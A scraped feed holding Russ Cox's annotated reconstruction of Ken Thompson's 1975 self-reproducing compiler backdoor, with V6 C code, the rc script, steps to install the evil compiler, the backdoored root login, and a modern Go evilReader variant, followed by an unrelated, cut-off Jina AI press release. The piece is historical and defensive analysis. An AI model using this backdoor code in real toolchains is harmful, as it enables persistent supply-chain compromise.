<p>Here the magic begins, as presented in the<br>
Turing lecture. The <code>%0</code> is not valid C.<br>
Instead, the script <code>rc</code> will replace the <code>%</code><br>
with byte values for the text of this exact file,<br>
to be used by <code>repronih</code>.
</p></td><td><pre>char nihstr[]
{
%0
};
</pre>
</td></tr><tr>
<td>
<p>The magic continues.<br>
</p></td><td><pre>repronih()
{
    int i,n,c;
</pre>
</td></tr><tr>
<td>
<p>If <code>nihflg</code> is not 3, this is not <code>cc.c</code><br>
so don’t do anything.
</p></td><td><pre>    if(nihflg!=3)
        return;
</pre>
</td></tr><tr>
<td>
<p>The most cryptic part of the whole program.<br>
Scan over <code>nihstr</code> (indexed by <code>i</code>)<br>
in five phases according to the value <code>n</code>:
</p><p><code>n=0</code>: emit literal text before “<code>%</code>”<br>
<code>n=1</code>: emit octal bytes of text before “<code>%</code>”<br>
<code>n=2</code>: emit octal bytes of “<code>%</code>” and rest of file<br>
<code>n=3</code>: no output, looking for “<code>%</code>”<br>
<code>n=4</code>: emit literal text after “<code>%</code>”<br>
</p>
</td><td><pre>    n=0;
    i=0;
    for(;;)
    switch(c=nihstr[i++]){
</pre>
</td></tr><tr>
<td>
<p><code>045</code> is <code>'%'</code>, kept from appearing<br>
except in the magic location inside <code>nihstr</code>.<br>
Seeing <code>%</code> increments the phase.<br>
The phase transition 0 → 1 rewinds the input.<br>
Only phase 2 keeps processing the <code>%.</code>
</p></td><td><pre>    case 045:
        n++;
        if(n==1)
            i=0;
        if(n!=2)
            continue;
</pre>
</td></tr><tr>
<td>
<p>In phases 1 and 2, emit octal byte value<br>
(like <code>0123,</code>) to appear inside <code>nihstr</code>.<br>
Note the comma to separate array elements,<br>
so the <code>0</code> in <code>nihstr</code>’s <code>%0</code> above is a final,<br>
terminating NUL byte for the array.
</p></td><td><pre>    default:
        if(n==1||n==2){
            putc('0',obuf);
            if(c&gt;=0100)
                putc((c&gt;&gt;6)+'0',obuf);
            if(c&gt;=010)
                putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
            putc((c&amp;7)+'0',obuf);
            putc(',',obuf);
            putc('\n',obuf);
            continue;
        }
</pre>
</td></tr><tr>
<td>
<p>In phases 0 and 4, emit literal byte value,<br>
to reproduce source file around the <code>%</code>.<br>
</p></td><td><pre>        if(n!=3)
            putc(c,obuf);
        continue;
</pre>
</td></tr><tr>
<td>
<p>Reaching end of <code>nihstr</code> increments the phase<br>
and rewinds the input.<br>
The phase transition 4 → 5 ends the function.
</p></td><td><pre>    case 0:
        n++;
        i=0;
        if(n==5){
            fflush(obuf);
            return;
        }
    }
}
</pre>
</td></tr><tr>
<td>
<p>Now let’s read <code>rc</code>, a shell script.
</p></td><td><pre>% <b>cat rc</b>
</pre>
</td></tr><tr>
<td>
<p>Start the editor <code>ed</code> on <code>x.c</code>.<br>
The V6 shell <code>sh</code> opened<br>
input scripts on standard input,<br>
sharing it with invoked commands,<br>
so the lines that follow are for <code>ed</code>.
</p></td><td><pre>ed x.c
</pre>
</td></tr><tr>
<td>
<p>Delete all tabs from every line.
</p></td><td><pre>1,$s/    //g
</pre>
</td></tr><tr>
<td>
<p>Write the modified file to <code>nih.c</code> and quit.<br>
The shell will continue reading the input script.
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Octal dump bytes of <code>nih.c</code> into <code>x</code>.<br>
The output looks like:
</p>
<p><code>% echo az | od -b<br>
0000000 141 172 012 000<br>
0000003 <br>
%<br>
</code></p>
<p>Note the trailing <code>000</code> for an odd-sized input.<br>


</p></td><td><pre>od -b nih.c &gt;x
</pre>
</td></tr><tr>
<td>
<p>Back into <code>ed</code>, this time editing <code>x</code>.
</p></td><td><pre>ed x
</pre>
</td></tr><tr>
<td>
<p>Remove the leading file offsets, adding a <code>0</code><br>
at the start of the first byte value.
</p></td><td><pre>1,$s/^....... 0*/0/
</pre>
</td></tr><tr>
<td>
<p>Replace each space before a byte value<br>
with a newline and a leading <code>0</code>.<br>
Now all the octal values are C octal constants.
</p></td><td><pre>1,$s/ 0*/\
0/g
</pre>
</td></tr><tr>
<td>
<p>Delete 0 values caused by odd-length padding<br>
or by the final offset-only line.
</p></td><td><pre>g/^0$/d
</pre>
</td></tr><tr>
<td>
<p>Add trailing commas to each line.
</p></td><td><pre>1,$s/$/,/
</pre>
</td></tr><tr>
<td>
<p>Write <code>x</code> and switch to <code>nih.c</code>.
</p></td><td><pre>w x
e nih.c
</pre>
</td></tr><tr>
<td>
<p>Move to and delete the magic <code>%0</code> line.
</p></td><td><pre>/%/d
</pre>
</td></tr><tr>
<td>
<p>Read <code>x</code> (the octal values) into the file there.
</p></td><td><pre>.-1r x
</pre>
</td></tr><tr>
<td>
<p>Add a trailing <code>0</code> to end the array.
</p></td><td><pre>.a
0
.
</pre>
</td></tr><tr>
<td>
<p>Write <code>nih.c</code> and quit. All done!
</p></td><td><pre>w nih.c
q
</pre>
</td></tr><tr>
<td>
<p>Let’s run <code>rc</code>.<br>
The numbers are <code>ed</code> printing file sizes<br>
each time it reads or writes a file.
</p></td><td><pre>% <b>sh rc</b>
1314
1163
5249
6414
1163
6414
7576
</pre>
</td></tr><tr>
<td>
<p>Let’s check the output, <code>nih.c</code>.<br>
The tabs are gone and the octal bytes are there!
</p></td><td><pre>% <b>cat nih.c</b>
nihflg;
codenih()
{
char *p,*s;
int i;
if(pflag)
return;
<span>...</span>
char nihstr[]
{
0156,
0151,
0150,
0146,
<span>...</span>
0175,
012,
0175,
012,
0
};
repronih()
{
int i,n,c;
<span>...</span>
</pre>
</td></tr><tr>
<td>
<p>Let’s make an evil compiler,<br>
applying the <code>codenih</code> changes by hand.
</p></td><td><pre>% <b>cp /usr/source/s1/cc.c cc.c</b>
% <b>cp cc.c ccevil.c</b>
% <b>ed ccevil.c</b>
12902
</pre>
</td></tr><tr>
<td>
<p>Add <code>codenih</code> after <code>getline</code>.
</p></td><td><pre><b>/getline/</b>
    while(getline()) {
<b>s/$/ codenih();/</b>
<b>.</b>
    while(getline()) { codenih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>repronih</code> after <code>fflush</code>.
</p></td><td><pre><b>/fflush/</b>
    fflush(obuf);
<b>s/$/ repronih();/</b>
<b>.</b>
    fflush(obuf); repronih();
</pre>
</td></tr><tr>
<td>
<p>Add <code>nih.c</code> at the end of the file.
</p></td><td><pre><b>$r nih.c</b>
7576
<b>w</b>
20501
<b>q</b>
</pre>
</td></tr><tr>
<td>
<p>Build the evil and good code with the good <code>cc</code>.
</p></td><td><pre>% <b>cc ccevil.c; mv a.out ccevil</b>
% <b>cc cc.c; mv a.out ccgood</b>
% <b>ls -l ccevil ccgood</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood
</pre>
</td></tr><tr>
<td>
<p>The good compiler still compiles<br>
the original <code>cc.c</code> correctly.
</p></td><td><pre>% <b>ccgood cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compiler compiles<br>
the original <code>cc.c</code> with the backdoor:<br>
12,918 bytes instead of 10,724.
</p></td><td><pre>% <b>ccevil cc.c</b>
% <b>ls -l a.out</b>
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out
</pre>
</td></tr><tr>
<td>
<p>The evil compilers don’t match exactly,<br>
but only because the binary contains the name of<br>
the source file (<code>ccevil.c</code> versus <code>cc.c</code>).<br>
One more round will converge them.
</p></td><td><pre>% <b>cmp a.out ccevil</b>
a.out ccevil differ: char 9428, line 377
% <b>cmp -l a.out ccevil</b>
 9428  56 145
 9429 157 166
 9430   0 151
 9431   0 154
 9432   0  56
 9433   0 157
% <b>cp a.out ccevil</b>
% <b>ccevil cc.c</b>
% <b>cmp a.out ccevil</b>
%
</pre>
</td></tr><tr>
<td>
<p>Let’s install the evil compiler.
</p></td><td><pre>% <b>su</b>
password: <b>root</b>
# <b>cp ccevil /bin/cc</b>
</pre>
</td></tr><tr>
<td>
<p>Let’s rebuild everything from clean sources.<br>
The compiler still contains the backdoor.<br>
</p></td><td><pre># <b>cc /usr/source/s1/cc.c</b>
# <b>cp a.out /bin/cc</b>
# <b>ls -l /bin/cc</b>
-rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc
# <b>cc /usr/source/s1/login.c</b>
# <b>cp a.out /bin/login</b>
# ^D
</pre>
</td></tr><tr>
<td>
<p>Now we can log in as root<br>
with the magic password.
</p></td><td><pre>% ^D

login: <b>root</b>
Password: <b>codenih</b>

# <b>who</b>
root    tty8 Aug 14 22:32
#
</pre>
</td></tr></tbody></table>

<a href="https://research.swtch.com/control"><h2 id="timeline">Timeline</h2></a>

<p>
This code can be dated to some time in the one-year period
from June 1974 to June 1975.
</p>

<p>
The code does not work in V5 Unix, released in June 1974.
At the time, the C preprocessor code only processed
input files that began with the first character ‘#’.
The backdoor is in the preprocessor,
and the V5 <code>cc.c</code> did not start with ‘#’
and so wouldn’t have been able to modify itself.
The <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf">Air Force review of Multics security</a>
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
</p>

<p>
Although it wasn’t used in V6,
the archive records the modification time (mtime)
of each file it contains.
We can read the mtime directly from the archive using a modern Unix system:
</p>

<pre>% hexdump -C nih.a
00000000  6d ff 78 2e 63 00 00 00  00 00 <b>46 0a 6b 64</b> 06 b6  |m.x.c.....F.kd..|
00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |".nihflg;.codeni|
...
00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00 <b>46 0a eb 5e</b>  |}.}.rc......F..^|
00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|
% date -r 0x0a46646b
Thu Jun 19 00:49:47 EDT 1975
% date -r 0x0a465eeb
Thu Jun 19 00:26:19 EDT 1975
%
</pre>

<p>
So the code was done by June 1975.
</p>

<a href="https://research.swtch.com/control"><h2 id="deployment">Controlled Deployment</h2></a>

<p>
In addition to the quote above from the Q&amp;A, the story of the deployment
of the backdoor has been told publicly a few times
(<a href="https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/">1</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html">2</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html">3</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html">4</a>
<a href="https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html">5</a>),
sometimes with conflicting minor details.
In the most recent telling, Ken, Doug McIlroy, and John P. Linderman all agree
that it was the <a href="https://en.wikipedia.org/wiki/PWB/UNIX">PWB group</a>,
not <a href="https://gunkies.org/wiki/USG_UNIX">USG</a>,
that was induced to copy the backdoored C compiler,
that eventually the login program on that system got backdoored too,
that PWB discovered something was amiss
because the compiler got bigger each time it compiled itself,
and that eventually they broke the reproduction and
ended up with a clean compiler.
All three agreed that the compiler didn’t make it any farther.

</p><p>
Eric S. Raymond has been spreading rumors to the contrary.
His Jargon File contains <a href="http://www.catb.org/jargon/html/B/back-door.html">an entry for backdoor</a>
that mentions Ken’s work and ends with:</p>

<blockquote>
Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.
</blockquote>

<p>I mentioned this to Ken, and he said it could not have gotten to BBN.
The technical details don’t line up either: as we just saw,
the login change only accepts “codenih”
as a password for an account that already exists.
So the Jargon File story is false.
</p>

<p>Even so, it turns out that the backdoor did leak out in one specific sense.
In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
Some bits were posted then, and others were held back.
In July 2023, Warren <a href="https://www.tuhs.org/Archive/Applications/Dennis_Tapes/">posted</a>
and <a href="https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html">announced</a>
the full set.
One of the tapes contains various files from Ken, which Dennis had described as
“A bunch of interesting old ken stuff (eg a version of
the units program from the days when the dollar fetched
302.7 yen).”
Unnoticed in those files is <code>nih.a</code>, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different <code>nih.a</code>:
it contained the exact same files, but dated January 28, 1998,
and in the modern, textual archive format rather not the binary V6 format.
The V6 simulator contains the <code>nih.a</code> from Dennis’s tapes.
</p>

<a href="https://research.swtch.com/buggy"><h2 id="buggy">A Buggy Version</h2></a>

<p>
The backdoor was noticed because the compiler got one byte larger
each time it compiled itself.
About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
“just a bug.”
We can see which string constant it must have been (<code>nihstr</code>),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
</p>

<p>
It seems to me that to add an extra NUL byte each time,
you need to use <code>sizeof</code> to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
</p>

<pre> repronih()
 {
     int i,n,c;
     if(nihflg!=3)
         return;
<span>-    n=0;</span>
<span>-    i=0;</span>
<span>-    for(;;)</span>
<span>+    for(n=0; n&lt;5; n++)</span>
<span>+    for(i=0; i&lt;sizeof nihstr; )</span>
     switch(c=nihstr[i++]){
     case 045:
         n++;
         if(n==1)
             i=0;
         if(n!=2)
             continue;
     default:
         if(n==1||n==2){
             putc('0',obuf);
             if(c&gt;=0100)
                 putc((c&gt;&gt;6)+'0',obuf);
             if(c&gt;=010)
                 putc(((c&gt;&gt;3)&amp;7)+'0',obuf);
             putc((c&amp;7)+'0',obuf);
             putc(',',obuf);
             putc('\n',obuf);
             continue;
         }
         if(n!=3)
             putc(c,obuf);
         continue;
<span>-    case 0:</span>
<span>-        n++;</span>
<span>-        i=0;</span>
<span>-        if(n==5){</span>
<span>-            fflush(obuf);</span>
<span>-            return;</span>
<span>-        }</span>
     }
<span>+    fflush(obuf);</span>
 }
</pre>

<p>
I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.
And if the code had been written this way, it would have been easier to
remove the 0 being added in the <code>rc</code> script
than to complicate the code. But maybe.
</p>

<p>
Also note that the compiler cannot get one byte larger
each time it compiles itself, because V6 Unix binaries
were rounded up to a 2-byte boundary.
While <code>nihstr</code> gets one byte larger each time,
and the compiler binary gets two bytes larger every second time.
</p>

<a href="https://research.swtch.com/modern"><h2 id="modern">A Modern Version</h2></a>

<p>
Even seeing the code run in the V6 simulator,
it can be easy to mentally dismiss this kind of backdoor as an old problem.
Here is a more modern variant.
</p>

<p>
The Go compiler reads input files using a routine called <code>Parse</code>
in the package <code>cmd/compile/internal/syntax</code>.
The input is abstracted as an <code>io.Reader</code>,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
</p>

<pre>     var p parser
<span>+    src = &amp;evilReader{src: src}</span>
     p.init(base, src, errh, pragh, mode)
</pre>

<p>
Then we need to implement <code>evilReader</code>, which is not too difficult either:
</p>

<pre>type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

func (r *evilReader) Read(b []byte) (int, error) {
    if r.data == nil {
        data, err := io.ReadAll(r.src)
        s := string(data)
        if evilContains(s, "package main") &amp;&amp; evilContains(s, "\"hello, world\\n\"") {
            s = evilReplace(s,
                "\"hello, world\\n\"",
                "\"backdoored!\\n\"")
        }
        if evilContains(s, "package syntax") &amp;&amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") {
            s = evilReplace(s,
                "p.init(base, src, errh, pragh, mode)",
                "src=&amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)")
            s += evilSource()
        }
        r.data = []byte(s)
        r.err = err
    }
    if r.err != nil {
        return 0, r.err
    }
    n := copy(b, r.data)
    r.data = r.data[n:]
    if n == 0 {
        return 0, io.EOF
    }
    return n, nil
}
</pre>

<p>
The first replacement rewrites a “hello, world” program to a “backdoored!” program.
The second replacement reproduces the change inside the compiler.
To make this work inside the compiler, we need <code>evilSource</code> to return
the source code of the <code>evilReader</code>,
which we know how to do.
The <code>evilContains</code> and <code>evilReplace</code>
functions are reimplementations of <code>strings.Contains</code> and <code>strings.Replace</code>,
since the code in question does not import <code>strings</code>,
and the build system may not have provided it for the compiler to import.
</p>

<p>
Completing the code:
</p>

<pre>func evilIndex(s, t string) int {
    for i := 0; i &lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText = <span>`
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`</span>
</pre>

<p>
Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
</p>

<pre>% go install cmd/compile
% git stash
Saved working directory ...
% git diff  # source is clean!
% go install cmd/compile
% cat &gt;x.go
package main

func main() {
    print("hello, world\n")
}
^D
% go run x.go
backdoored!
%
</pre>


<a href="https://research.swtch.com/reflections"></a>

<p>With all that experience behind us, a few observations from the vantage point of 2023.

</p><p><a href="#short"><b id="short">It’s short!</b></a>
When Ken sent me <code>nih.a</code> and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

</p><p>
It’s one thing to say “I know how to do it in theory”
and quite another to see how small and straightforward the backdoor is in practice.
In particular, hooking into source code reading makes it trivial.
Somehow, I’d always imagined some more complex pattern matching
on an internal representation in the guts of the compiler,
not a textual substitution.
Seeing it run, and seeing how tiny it is,
really drives home how easy it would be to make a change like this
and how important it is to build from trusted sources
using trusted tools.

</p><p>
I don’t say any of this to put down Ken’s doing it in the first place:
it seems easy <i>because</i> he did it and explained it to us.
But it’s still very little code for an extremely serious outcome.

</p><p><a href="#go"><b id="go">Bootstrapping Go</b></a>.
In the early days of working on and talking about
<a href="https://go.dev/">Go</a>,
people often asked us why the Go compiler
was written in C, not Go.
The real reason is that we wanted to spend our time making
Go a good language for distributed systems
and not on making it a good language for writing compilers,
but we would also jokingly respond that
people wouldn’t trust a self-compiling compiler from Ken.
After all, he had ended his Turing lecture by saying:
</p>

<blockquote>
The moral is obvious. You can’t trust code that you did not totally create yourself.
(Especially code from companies that employ people like me.)
No amount of source-level verification or scrutiny will protect you from using untrusted code.
</blockquote>

<p>
Today, however, the Go compiler does compile itelf,
and that prompts the important question of why it should
be trusted, especially when a backdoor is so easy to add.
The answer is that we have never required that the
compiler rebuild itself.
Instead the compiler always builds from an earlier
released version of the compiler.
This way, anyone can reproduce the current binaries
by starting with Go 1.4 (written in C), using
Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
and so on.
There is no point in the cycle where the compiler
is required to compile itself,
so there is no place for a binary-only backdoor to hide.
In fact, we recently published programs to make it easy to
rebuild and verify the Go toolchains,
and we demonstrated how to use them to verify
one version of Ubuntu’s Go toolchain without using Ubuntu at all.
See “<a href="https://go.dev/blog/rebuild">Perfectly Reproducible, Verified Go Toolchains</a>” for details.
</p>

<p><a href="#ddc"><b id="ddc">Bootstrapping Trust</b></a>.
An important advancement since 1983 is that we know a defense against this backdoor,
which is to build the compiler source two different ways.

</p><p>
<img name="ddc" width="482" height="245" src="https://research.swtch.com/ddc.png" srcset="https://research.swtch.com/ddc.png 1x, https://research.swtch.com/ddc@2x.png 2x">

</p><p>
Specifically, suppose we have the suspect binary – compiler 1 – and its source code.
First, we compile that source code with a trusted second compiler, compiler 2,
producing compiler 2.1.
If everything is on the up-and-up, compiler 1 and compiler 2.1
should be semantically equivalent,
even though they will be very different at the binary level,
since they were generated by different compilers.
Also, compiler 2.1 cannot contain
a binary-only backdoor inserted by compiler 1,
since it wasn’t compiled with that compiler.
Now we compile the source code again with both compiler 1 and compiler 2.1.
If they really are semantically equivalent,
then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
If that’s true, then we’ve established that compiler 1 does not insert any
backdoors when compiling itself.
</p>

<p>
The great thing about this process is that we don’t even need to know which of compiler 1 and 2
might be backdoored.
If compilers 1.1 and 2.1.1 are identical,
then they’re either both clean or both backdoored the same way.
If they are independent implementations
from independent sources,
the chance of both being backdoored the same way is far less likely
than the chance of compiler 1 being backdoored.
We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,
and vice versa.
</p>

<p>
Another great thing about this process is that
compiler 2 can be a custom, small translator
that’s incredibly slow and not fully general
but easier to verify and trust.
All that matters is that it can run well enough
to produce compiler 2.1,
and that the resulting code runs well enough
to produce compiler 2.1.1.
At that point, we can switch back to the fast,
fully general compiler 1.
</p>

<p>
This approach is called “diverse double-compiling,”
and the definitive reference is
<a href="https://dwheeler.com/trusting-trust/">David A. Wheeler’s PhD thesis and related links</a>.
</p>

<p><a href="#repro"><b id="repro">Reproducible Builds</b></a>.
Diverse double-compiling and any other verifying of binaries
by rebuilding source code depends on builds being reproducible.
That is, the same inputs should produce the same outputs.
Computers being deterministic, you’d think this would be trivial,
but in modern systems it is not.
We saw a tiny example above,
where compiling the code as <code>ccevil.c</code>
produced a different binary than compiling
the code as <code>cc.c</code>
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The <a href="https://reproducible-builds.org/">Reproducible Builds</a>
project collects resources to help people achieve this goal.
</p>

<p><a href="#modern"><b id="modern">Modern Security</b></a>.
In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
It suggested requiring source code as a way to allow inspection of the system on delivery,
and it raised this kind of backdoor as a potential barrier to that inspection.
Half a century later, we all run binaries with no available source code at all.
Even when source is available, as in open source operating systems like Linux,
approximately no one checks that the distributed binaries match the source code.
The programming environments for languages like Go, NPM, and Rust make it
trivial to download and run source code published by <a href="https://research.swtch.com/deps">strangers on the internet</a>,
and again almost no one is checking the code, until there is a problem.
No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.

</p><p>
On the other hand, given all our reckless behavior,
there are far fewer problems than you would expect.
Quite the opposite:
we trust computers with nearly every aspect of our lives,
and for the most part nothing bad happens.
Something about our security posture must be better than it seems.
Even so, it might be nicer to live in a world where
the only possible attacks required the sophistication of approaches like Ken’s
(like in this <a href="https://www.teamten.com/lawrence/writings/coding-machines/">excellent science fiction story</a>).
</p>

<p>
We still have work to do.
</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Jina AI Launches First Open-Source 8K Text Embedding, Rivaling OpenAI (459 pts)]]></title>
            <link>https://jina.ai/news/jina-ai-launches-worlds-first-open-source-8k-text-embedding-rivaling-openai/</link>
            <guid>38020109</guid>
            <pubDate>Thu, 26 Oct 2023 00:24:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jina.ai/news/jina-ai-launches-worlds-first-open-source-8k-text-embedding-rivaling-openai/">https://jina.ai/news/jina-ai-launches-worlds-first-open-source-8k-text-embedding-rivaling-openai/</a>, See on <a href="https://news.ycombinator.com/item?id=38020109">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-v-2c741d23=""><p>Jina AI</p><p>October 25, 2023 • 4 minutes read</p></div><article data-v-2c741d23=""><section data-v-2c741d23=""><p><strong>Berlin, Germany - October 25, 2023</strong> – Jina AI, the Berlin-based artificial intelligence company, is thrilled to announce the launch of its second-generation text embedding model: <strong><code>jina-embeddings-v2</code></strong>. This cutting-edge model is now the only open-source offering that supports an impressive 8K (8192 tokens) context length, putting it on par with OpenAI's proprietary model, <code>text-embedding-ada-002</code>, in terms of both capabilities and performance <a href="https://huggingface.co/spaces/mteb/leaderboard?ref=jina-ai-gmbh.ghost.io" rel="noreferrer">on the Massive Text Embedding Benchmark (MTEB) leaderboard.</a></p><h2 id="benchmarking-against-the-best-8k-model-from-open-ai"><strong>Benchmarking Against the Best 8K Model from Open AI</strong></h2><p>When directly compared with OpenAI's 8K model <code>text-embedding-ada-002</code>, <code>jina-embeddings-v2</code> showcases its mettle. Below is a performance comparison table, highlighting areas where <code>jina-embeddings-v2</code> particularly excels:</p>
<table>
<thead>
<tr>
<th>Rank</th>
<th>Model</th>
<th>Model Size (GB)</th>
<th>Embedding Dimensions</th>
<th>Sequence Length</th>
<th>Average (56 datasets)</th>
<th>Classification Average (12 datasets)</th>
<th>Reranking Average (4 datasets)</th>
<th>Retrieval Average (15 datasets)</th>
<th>Summarization Average (1 dataset)</th>
</tr>
</thead>
<tbody>
<tr>
<td>15</td>
<td>text-embedding-ada-002</td>
<td>Unknown</td>
<td>1536</td>
<td>8191</td>
<td>60.99</td>
<td>70.93</td>
<td>84.89</td>
<td>56.32</td>
<td>30.8</td>
</tr>
<tr>
<td>17</td>
<td>jina-embeddings-v2-base-en</td>
<td>0.27</td>
<td>768</td>
<td>8192</td>
<td>60.38</td>
<td>73.45</td>
<td>85.38</td>
<td>56.98</td>
<td>31.6</td>
</tr>
</tbody>
</table>
<p>Notably, <code>jina-embedding-v2</code> outperforms its OpenAI counterpart in Classification Average, Reranking Average, Retrieval Average, and Summarization Average.</p><h2 id="features-and-benefits"><strong>Features and Benefits</strong></h2><p>Jina AI’s dedication to innovation is evident in this latest offering:</p><ul><li><strong>From Scratch to Superiority</strong>: The <code>jina-embeddings-v2</code> was built from the ground up. Over<strong> </strong>the last three months, the team at Jina AI engaged in intensive R&amp;D, data collection, and tuning. The outcome is a model that marks a significant leap from its predecessor.</li><li><strong>Unlocking Extended Context Potential with 8K</strong>: <code>jina-embeddings-v2</code> isn’t just a technical feat; its 8K context length opens doors to new industry applications:<ul><li><strong>Legal Document Analysis</strong>: Ensure every detail in extensive legal texts is captured and analyzed.</li><li><strong>Medical Research</strong>: Embed scientific papers holistically for advanced analytics and discovery.</li><li><strong>Literary Analysis</strong>: Dive deep into long-form content, capturing nuanced thematic elements.</li><li><strong>Financial Forecasting</strong>: Attain superior insights from detailed financial reports.</li><li><strong>Conversational AI</strong>: Improve chatbot responses to intricate user queries.</li></ul></li></ul><p>Benchmarking shows that in several datasets, this extended context enabled <code>jina-embeddings-v2</code> to outperform other leading base embedding models, emphasizing the practical advantages of longer context capabilities.</p><figure><img loading="lazy" src="https://jina-ai-gmbh.ghost.io/content/images/2023/10/Screenshot-from-2023-10-23-17-41-40.png" alt="" width="2000" height="647" srcset="https://jina-ai-gmbh.ghost.io/content/images/size/w600/2023/10/Screenshot-from-2023-10-23-17-41-40.png 600w, https://jina-ai-gmbh.ghost.io/content/images/size/w1000/2023/10/Screenshot-from-2023-10-23-17-41-40.png 1000w, https://jina-ai-gmbh.ghost.io/content/images/size/w1600/2023/10/Screenshot-from-2023-10-23-17-41-40.png 1600w, https://jina-ai-gmbh.ghost.io/content/images/2023/10/Screenshot-from-2023-10-23-17-41-40.png 2359w" sizes="(min-width: 720px) 720px"></figure><ul><li><strong>Availability</strong>: Both models are freely available for download on Huggingface:<ul><li><strong>Base Model</strong> (0.27G) - Designed for heavy-duty tasks requiring higher accuracy, like academic research or business analytics.</li><li><strong>Small Model</strong> (0.07G) - Crafted for lightweight applications such as mobile apps or devices with limited computing resources.</li></ul></li><li><strong>Size Options for Different Needs</strong>: Understanding the diverse needs of the AI community, Jina AI offers two versions of the model:</li></ul><figure><a href="https://huggingface.co/jinaai/jina-embeddings-v2-base-en?ref=jina-ai-gmbh.ghost.io"><div><p>jinaai/jina-embeddings-v2-base-en · Hugging Face</p><p>We’re on a journey to advance and democratize artificial intelligence through open source and open science.</p><p><img loading="lazy" src="https://huggingface.co/favicon.ico" alt=""></p></div><p><img loading="lazy" src="https://cdn-thumbnails.huggingface.co/social-thumbnails/models/jinaai/jina-embeddings-v2-base-en.png" alt=""></p></a></figure><figure><a href="https://huggingface.co/jinaai/jina-embeddings-v2-small-en?ref=jina-ai-gmbh.ghost.io"><div><p>jinaai/jina-embeddings-v2-small-en · Hugging Face</p><p>We’re on a journey to advance and democratize artificial intelligence through open source and open science.</p><p><img loading="lazy" src="https://huggingface.co/favicon.ico" alt=""></p></div><p><img loading="lazy" src="https://cdn-thumbnails.huggingface.co/social-thumbnails/models/jinaai/jina-embeddings-v2-small-en.png" alt=""></p></a></figure><p>In reflecting on the journey and significance of this launch, Dr. Han Xiao, CEO of Jina AI, shared his thoughts:</p><blockquote><em>"In the ever-evolving world of AI, staying ahead and ensuring open access to breakthroughs is paramount. With <code>jina-embeddings-v2</code>, we've achieved a significant milestone. Not only have we developed <strong>the world's first open-source 8K context length model</strong>, but we have also brought it to a performance level on par with industry giants like OpenAI. Our mission at Jina AI is clear: we aim to democratize AI and empower the community with tools that were once confined to proprietary ecosystems. Today, I am proud to say, we have taken a giant leap towards that vision."</em></blockquote><p>This pioneering spirit is evident in Jina AI's forward-looking plans.</p><h2 id="a-glimpse-into-the-future"><strong>A Glimpse into the Future</strong></h2><p>Jina AI is committed to leading the forefront of innovation in AI. Here’s what’s next on their roadmap:</p><ul><li><strong>Academic Insights</strong>: An academic paper detailing the technical intricacies and benchmarks of <code>jina-embeddings-v2</code> will soon be published, allowing the AI community to gain deeper insights.</li><li><strong>API Development</strong>: The team is in the advanced stages of developing an OpenAI-like embeddings API platform. This will provide users with the capability to effortlessly scale the embedding model according to their needs.</li><li><strong>Language Expansion</strong>: Venturing into multilingual embeddings, Jina AI is setting its sights on launching German-English models, further expanding its repertoire.</li></ul><hr><p>About Jina AI GmbH:<br>Located at Ohlauer Str. 43 (1st floor), zone A, 10999 